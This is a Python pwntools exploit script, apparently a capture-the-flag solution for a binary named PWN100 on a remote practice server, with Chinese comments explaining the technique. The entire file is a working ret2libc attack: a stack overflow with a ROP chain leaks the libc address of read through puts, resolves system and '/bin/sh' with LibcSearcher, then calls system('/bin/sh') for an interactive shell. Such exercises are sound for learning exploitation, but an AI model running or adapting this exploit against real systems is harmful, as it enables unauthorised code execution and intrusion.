#coding:utf-8
from pwn import *
from LibcSearcher import *
local = 0
if local:         #if else 使用选择本地或者远程
	p = process('./PWN100')
else:
	p = remote("111.198.29.45", 30867)

elf = ELF("./PWN100")
start_addr =  0x400550
readn= 0x40063D
puts_plt = elf.plt['puts']
read_got = elf.got['read']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400763
pop_rsi_r15 = 0x0000000000400761
bss = 0x601050
binstr_offest=0x17c8c3

def leak(addr):
    payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)#puts函数调用完后，返回start函数
    payload = payload.ljust(200,"a")
     #用a填充至200，向右填充，因为程序每次只read 1uLL，函数读取200次才会结束，然后去到返还地址
    p.send(payload)
    p.recvuntil("bye~")
    return u64(p.recv()[1:-1].ljust(8,'\0'))

def inputs():
    payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(bss) +p64(pop_rsi_r15) + p64(8) + p64(0) + p64(readn) + p64(start_addr)#写入bss的方法
    payload = payload.ljust(200, "a")
    p.send(payload)
    sleep(1)
    p.recvuntil("bye~\n")
    p.send("/bin/sh\00")

def callsys():
    payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr) + p64(start_addr)  #调用system部分
    payload = payload.ljust(200, "a")
    p.send(payload)
    p.recvuntil("bye~")
read_addr=leak(read_got)#计算system函数地址部分
libc=LibcSearcher("read",read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
bin_addr= libc_base + binstr_offest
print "[*]system address: "+hex(system_addr)
#inputs()
callsys()
p.interactive()

    #64位系统传参顺序： rdi, rsi, rdx, rcx, r8, r9
    #x64rop形式：pop_rdi_ret+第一个参数+func_addr+_start_addr
    #rsi赋值的时候，需要再pop出一个参数赋值给r15，因为pop rsi ; pop r15 ; ret是pop出栈中的两个参数
